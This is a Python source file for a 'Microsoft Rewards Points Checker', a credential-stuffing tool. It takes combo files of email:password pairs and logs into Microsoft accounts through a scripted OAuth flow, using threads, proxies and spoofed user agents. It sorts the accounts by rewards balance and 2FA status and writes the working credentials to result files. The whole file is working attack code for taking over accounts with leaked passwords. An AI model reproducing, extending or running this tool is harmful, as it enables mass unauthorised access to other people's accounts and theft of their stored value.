import requests
import json
import urllib.parse
import user_agent
import threading
import re
import time
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

print_lock = threading.Lock()
stats_lock = threading.Lock()

# Statistics
stats = {
    'checked': 0,
    'hits': 0,
    'free': 0,
    'bad': 0,
    'blocked': 0,
    'errors': 0,
    'premium_7k': 0,
    'ultra_20k': 0
}

def clear_screen():
    """Clear console screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Clean professional banner"""
    clear_screen()
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                                  ║
{Fore.CYAN}║        {Fore.YELLOW}███╗   ███╗{Fore.CYAN}███████╗    {Fore.GREEN}██████╗  ██████╗ ██╗███╗   ██╗████████╗{Fore.CYAN}║
{Fore.CYAN}║        {Fore.YELLOW}████╗ ████║{Fore.CYAN}██╔════╝    {Fore.GREEN}██╔══██╗██╔═══██╗██║████╗  ██║╚══██╔══╝{Fore.CYAN}║
{Fore.CYAN}║        {Fore.YELLOW}██╔████╔██║{Fore.CYAN}███████╗    {Fore.GREEN}██████╔╝██║   ██║██║██╔██╗ ██║   ██║   {Fore.CYAN}║
{Fore.CYAN}║        {Fore.YELLOW}██║╚██╔╝██║{Fore.CYAN}╚════██║    {Fore.GREEN}██╔═══╝ ██║   ██║██║██║╚██╗██║   ██║   {Fore.CYAN}║
{Fore.CYAN}║        {Fore.YELLOW}██║ ╚═╝ ██║{Fore.CYAN}███████║    {Fore.GREEN}██║     ╚██████╔╝██║██║ ╚████║   ██║   {Fore.CYAN}║
{Fore.CYAN}║        {Fore.YELLOW}╚═╝     ╚═╝{Fore.CYAN}╚══════╝    {Fore.GREEN}╚═╝      ╚═════╝ ╚═╝╚═╝  ╚═══╝   ╚═╝   {Fore.CYAN}║
{Fore.CYAN}║                                                                  ║
{Fore.CYAN}║              {Fore.WHITE}Microsoft Rewards Points Checker v2.1               {Fore.CYAN}║
{Fore.CYAN}║                  {Fore.GREEN}Premium Edition - Fast & Accurate                 {Fore.CYAN}║
{Fore.CYAN}║                                                                  ║
{Fore.CYAN}║                  {Fore.MAGENTA}Credits: luff.y_ (Discord)                      {Fore.CYAN}║
{Fore.CYAN}║                                                                  ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝
"""
    print(banner)

def update_progress(total, callback=None):
    """Clean progress bar display"""
    with stats_lock:
        percent = min((stats['checked'] / total * 100), 100) if total > 0 else 0
        bar_len = 50
        filled = int(bar_len * percent / 100)
        bar = '█' * filled + '░' * (bar_len - filled)
        
        status_line = (f"[{bar}] {percent:.1f}% | "
              f"Hits: {stats['hits']} | "
              f"Free: {stats['free']} | "
              f"Bad: {stats['bad']} | "
              f"2FA: {stats['blocked']} | "
              f"7K+: {stats['premium_7k']} | "
              f"20K+: {stats['ultra_20k']}")
        print(f"\r{Fore.CYAN}{status_line}", end='', flush=True)
        if callback:
            callback(status_line)

class MicrosoftPointsChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.proxies = {'http': proxy, 'https': proxy} if proxy else None
        self.session.verify = False
        
    def check_account(self, email, password):
        """Enhanced login flow combining z.py and h.py methods"""
        try:
            # Step 1: IDP Check (from h.py)
            idp_url = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            idp_resp = self.session.get(
                idp_url,
                headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"},
                timeout=10,
                proxies=self.proxies
            )
            
            # Validate account exists
            if any(x in idp_resp.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in idp_resp.text:
                return {'status': 'fail', 'message': 'Invalid account', 'email': email}
            
            # Step 2: OAuth Authorization (combined method)
            headers_auth = {
                "User-Agent": str(user_agent.generate_user_agent()),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            }
            
            params = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "login_hint": email,
                "response_type": "code",
                "client_info": "1",
                "haschrome": "1",
                "mkt": "en"
            }
            
            auth_url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            
            res_auth = self.session.get(auth_url, headers=headers_auth, timeout=12, proxies=self.proxies)
            
            if res_auth.status_code != 200:
                return {'status': 'error', 'message': 'Auth failed', 'email': email}
            
            cookies = res_auth.cookies.get_dict()
            
            # Enhanced parsing (h.py method)
            url_match = re.search(r'urlPost":"([^"]+)"', res_auth.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', res_auth.text)
            
            if not url_match or not ppft_match:
                # Fallback parsing
                if '"urlPost":"' in res_auth.text:
                    host = res_auth.text.split('"urlPost":"')[1].split('"')[0].replace('\\/', '/')
                else:
                    return {'status': 'error', 'message': 'Parse error', 'email': email}
                
                if 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"' in res_auth.text:
                    ppft = res_auth.text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
                elif 'name="PPFT" id="i0327" value="' in res_auth.text:
                    ppft = res_auth.text.split('name="PPFT" id="i0327" value="')[1].split('"')[0]
                else:
                    return {'status': 'error', 'message': 'Parse error', 'email': email}
            else:
                host = url_match.group(1).replace("\\/", "/")
                ppft = ppft_match.group(1)
            
            # Step 3: Submit credentials (h.py method - more reliable)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
            
            headers_login = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": str(user_agent.generate_user_agent()),
                "Origin": "https://login.live.com",
                "Referer": res_auth.url
            }
            
            res_login = self.session.post(
                host,
                data=login_data,
                headers=headers_login,
                allow_redirects=False,
                timeout=12,
                proxies=self.proxies
            )
            
            # Enhanced error detection (h.py method)
            response_text = res_login.text.lower()
            
            # Check for explicit failures
            if any(x in response_text for x in [
                "account or password is incorrect",
                "error",
                "incorrect password",
                "invalid credentials",
                "doesn't exist"
            ]):
                return {'status': 'fail', 'message': 'Invalid credentials', 'email': email}
            
            # Check for account issues (h.py method)
            if any(url in res_login.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
                return {'status': 'blocked', 'message': 'Account locked', 'email': email}
            
            # Check for 2FA
            if any(x in response_text for x in ['verify', 'security code', 'authenticator', 'phone number']):
                return {'status': 'blocked', 'message': '2FA required', 'email': email}
            
            # Extract auth code
            location = res_login.headers.get("Location", "")
            login_cookies = res_login.cookies.get_dict()
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                if 'code=' in res_login.text:
                    code_match = re.search(r'code=([^&\'"]+)', res_login.text)
                if not code_match:
                    return {'status': 'error', 'message': 'No auth code', 'email': email}
            
            auth_code = code_match.group(1)
            
            # Step 4: Token exchange
            token_data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            token_res = self.session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=token_data,
                timeout=10,
                proxies=self.proxies
            )
            
            if token_res.status_code != 200 or "access_token" not in token_res.text:
                return {'status': 'error', 'message': 'Token failed', 'email': email}
            
            token = token_res.json().get("access_token")
            if not token:
                return {'status': 'error', 'message': 'No token', 'email': email}
            
            # Get CID (h.py method)
            cid = login_cookies.get('MSPCID', '').upper()
            if not cid:
                for cookie in self.session.cookies:
                    if cookie.name == "MSPCID":
                        cid = cookie.value.upper()
                        break
            
            # Step 5: Fetch points
            points = self.get_points_optimized(email, password, login_cookies, token, cid)
            
            if points is not None and points != 'Unable to fetch':
                if points > 0:
                    return {
                        'status': 'success',
                        'points': points,
                        'email': email,
                        'password': password
                    }
                else:
                    return {
                        'status': 'free',
                        'points': 0,
                        'email': email,
                        'password': password
                    }
            
            return {
                'status': 'success',
                'points': 'Unable to fetch',
                'email': email,
                'password': password
            }
            
        except requests.exceptions.Timeout:
            return {'status': 'error', 'message': 'Timeout', 'email': email}
        except Exception as e:
            return {'status': 'error', 'message': str(e)[:20], 'email': email}
    
    def get_points_optimized(self, email, password, cookies, token, cid):
        """Optimized points fetching"""
        try:
            # Set cookies
            for key, value in cookies.items():
                self.session.cookies.set(key, value, domain=".bing.com")
                self.session.cookies.set(key, value, domain=".microsoft.com")
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
                "Accept": "application/json, text/plain, */*",
                "Referer": "https://rewards.bing.com/"
            }
            
            # Method 1: Primary Bing API
            try:
                resp = self.session.get(
                    "https://rewards.bing.com/api/getuserinfo",
                    headers=headers,
                    timeout=8,
                    proxies=self.proxies
                )
                
                if resp.status_code == 200:
                    data = resp.json()
                    if 'availablePoints' in data:
                        return int(data['availablePoints'])
                    if 'dashboard' in data and isinstance(data['dashboard'], dict):
                        if 'userStatus' in data['dashboard'] and 'availablePoints' in data['dashboard']['userStatus']:
                            return int(data['dashboard']['userStatus']['availablePoints'])
            except:
                pass
            
            # Method 2: Flyout API
            try:
                resp = self.session.get(
                    "https://www.bing.com/rewardsapp/flyoutHub?format=json",
                    headers=headers,
                    timeout=8,
                    proxies=self.proxies
                )
                
                if resp.status_code == 200:
                    data = resp.json()
                    if 'userInfo' in data and 'balance' in data['userInfo']:
                        return int(data['userInfo']['balance'])
            except:
                pass
            
            # Method 3: Page scraping
            try:
                resp = self.session.get(
                    "https://rewards.bing.com",
                    headers={"User-Agent": headers["User-Agent"]},
                    timeout=10,
                    proxies=self.proxies
                )
                
                if resp.status_code == 200:
                    match = re.search(r'"availablePoints"\s*:\s*(\d+)', resp.text)
                    if match:
                        points = int(match.group(1))
                        if 0 <= points <= 500000:
                            return points
            except:
                pass
            
            return None
            
        except:
            return None


def save_result(filename, content):
    """Thread-safe file saving"""
    with print_lock:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content)


def check_single(email, password, proxy=None, total=0, callback=None):
    """Check single account"""
    checker = MicrosoftPointsChecker(proxy=proxy)
    result = checker.check_account(email, password)
    
    with stats_lock:
        stats['checked'] += 1
    
    # Process results
    if result['status'] == 'success':
        points = result.get('points', 'Unknown')
        with stats_lock:
            stats['hits'] += 1
            
        if isinstance(points, int):
            save_result('Results/ms_points_hits.txt', f"{email}:{password} | {points} points\n")
            
            if points >= 20000:
                with stats_lock:
                    stats['ultra_20k'] += 1
                save_result('Results/ms_points_20k+.txt', f"{email}:{password} | {points} points\n")
                with print_lock:
                    print(f"\n{Fore.LIGHTMAGENTA_EX}💎 [ULTRA] {email} | {points} points")
            elif points >= 7000:
                with stats_lock:
                    stats['premium_7k'] += 1
                save_result('Results/ms_points_7k+.txt', f"{email}:{password} | {points} points\n")
                with print_lock:
                    print(f"\n{Fore.LIGHTYELLOW_EX}⭐ [PREMIUM] {email} | {points} points")
            else:
                with print_lock:
                    print(f"\n{Fore.GREEN}✓ [HIT] {email} | {points} points")
        else:
            save_result('Results/ms_points_hits.txt', f"{email}:{password} | Points: {points}\n")
            
    elif result['status'] == 'free':
        with stats_lock:
            stats['free'] += 1
        save_result('Results/ms_points_free.txt', f"{email}:{password}\n")
        
    elif result['status'] == 'fail':
        with stats_lock:
            stats['bad'] += 1
            
    elif result['status'] == 'blocked':
        with stats_lock:
            stats['blocked'] += 1
        save_result('Results/ms_points_blocked.txt', f"{email}:{password}\n")
        
    else:
        with stats_lock:
            stats['errors'] += 1
    
    if total > 0:
        update_progress(total, callback)
    
    return result


def check_bulk(combo_file, threads=15, proxy=None, callback=None):
    """Bulk checker"""
    try:
        # Create Results folder
        if not os.path.exists('Results'):
            os.makedirs('Results')
        
        with open(combo_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if ':' in line]
        
        total = len(lines)
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║  {Fore.WHITE}Starting Check                                                   {Fore.CYAN}║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝\n")
        print(f"{Fore.YELLOW}Total Accounts: {Fore.WHITE}{total}")
        print(f"{Fore.YELLOW}Threads: {Fore.WHITE}{threads}")
        print(f"{Fore.YELLOW}Status: {Fore.GREEN}RUNNING{Fore.WHITE}\n")
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for line in lines:
                if ':' in line:
                    parts = line.split(':', 1)
                    email = parts[0].strip()
                    password = parts[1].strip()
                    future = executor.submit(check_single, email, password, proxy, total, callback)
                    futures.append(future)
            
            for future in futures:
                future.result()
        
        elapsed = time.time() - start
        
        # Summary
        print(f"\n\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                        {Fore.WHITE}FINAL RESULTS                             {Fore.CYAN}║")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║  {Fore.GREEN}✓ Hits: {stats['hits']:<20}{Fore.CYAN}                                 ║")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}○ Free: {stats['free']:<20}{Fore.CYAN}                                 ║")
        print(f"{Fore.CYAN}║  {Fore.RED}✗ Bad: {stats['bad']:<20}{Fore.CYAN}                                  ║")
        print(f"{Fore.CYAN}║  {Fore.MAGENTA}⊗ 2FA: {stats['blocked']:<20}{Fore.CYAN}                                  ║")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║  {Fore.LIGHTYELLOW_EX}⭐ Premium (7K+): {stats['premium_7k']:<15}{Fore.CYAN}                       ║")
        print(f"{Fore.CYAN}║  {Fore.LIGHTMAGENTA_EX}💎 Ultra (20K+): {stats['ultra_20k']:<15}{Fore.CYAN}                        ║")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║  {Fore.WHITE}Time: {elapsed:.2f}s | Speed: {total/elapsed:.2f} acc/s{Fore.CYAN}                ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝\n")
        
        # Files saved
        if stats['hits'] > 0 or stats['free'] > 0:
            print(f"{Fore.GREEN}💾 Results saved in Results/ folder")
        
        print(f"\n{Fore.MAGENTA}Credits: luff.y_ (Discord){Fore.WHITE}\n")
        
    except FileNotFoundError:
        print(f"{Fore.RED}✗ File not found: {combo_file}")
    except Exception as e:
        print(f"{Fore.RED}✗ Error: {e}")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    print_banner()
    
    print(f"{Fore.YELLOW}[1] {Fore.WHITE}Single Account Check")
    print(f"{Fore.YELLOW}[2] {Fore.WHITE}Bulk Check\n")
    choice = input(f"{Fore.GREEN}➜ Choose option: {Fore.WHITE}").strip()
    
    if choice == '1':
        print(f"\n{Fore.CYAN}Single Account Check{Fore.WHITE}")
        print("─" * 50)
        email = input(f"{Fore.YELLOW}Email: {Fore.WHITE}").strip()
        password = input(f"{Fore.YELLOW}Password: {Fore.WHITE}").strip()
        proxy = input(f"{Fore.YELLOW}Proxy (optional): {Fore.WHITE}").strip() or None
        
        print(f"\n{Fore.CYAN}Checking...{Fore.WHITE}\n")
        
        if not os.path.exists('Results'):
            os.makedirs('Results')
        
        result = check_single(email, password, proxy)
        print(f"\n{Fore.WHITE}Done!{Fore.WHITE}\n")
        
    elif choice == '2':
        combo = input(f"\n{Fore.YELLOW}Combo file: {Fore.WHITE}").strip()
        threads = input(f"{Fore.YELLOW}Threads (default 15): {Fore.WHITE}").strip()
        threads = int(threads) if threads.isdigit() else 15
        proxy = input(f"{Fore.YELLOW}Proxy (optional): {Fore.WHITE}").strip() or None
        
        check_bulk(combo, threads, proxy)
    
    else:
        print(f"{Fore.RED}✗ Invalid choice!")
